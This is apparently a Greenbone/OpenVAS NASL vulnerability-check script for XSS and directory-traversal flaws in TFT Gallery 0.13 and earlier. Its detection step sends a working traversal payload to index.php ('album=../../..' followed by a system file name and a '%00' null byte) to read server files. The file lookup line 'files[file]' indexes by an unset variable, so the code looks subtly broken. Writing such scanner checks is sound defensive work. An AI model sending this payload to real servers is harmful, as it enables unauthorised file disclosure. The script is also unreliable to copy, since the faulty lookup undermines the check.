CPE = "cpe:/a:tftgallery:tftgallery";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900974" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-11-17 15:16:05 +0100 (Tue, 17 Nov 2009)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2009-3911", "CVE-2009-3912" );
	script_bugtraq_id( 36898, 36899 );
	script_name( "TFT Gallery XSS And Directory Traversal Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "tftgallery_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "tftgallery/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/37156" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/54087" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/0911-exploits/tftgallery-traversal.txt" );
	script_xref( name: "URL", value: "http://www.tftgallery.org" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to disclose
  sensitive information and conduct cross-site scripting attacks." );
	script_tag( name: "affected", value: "TFT Gallery version 0.13 and prior on all platforms." );
	script_tag( name: "insight", value: "- Error exists when input passed via the 'sample' parameter to
  settings.php is not properly sanitised before being returned to the user. This
  can be exploited to execute arbitrary HTML and script code or conduct XSS attacks.

  - Input passed via the 'album' parameter to index.php is not properly
  verified before being used to include files via a '../'. This can be
  exploited to include arbitrary files from local resources via directory
  traversal attacks and URL-encoded NULL bytes." );
	script_tag( name: "solution", value: "Upgrade to version 0.13.1 or later." );
	script_tag( name: "summary", value: "This host is installed with TFT Gallery and is prone to Cross-
  Site Scripting and Directory Traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[file];
	url = dir + "/index.php?album=../../../../../../../../../../" + file + "%00&page=1>";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

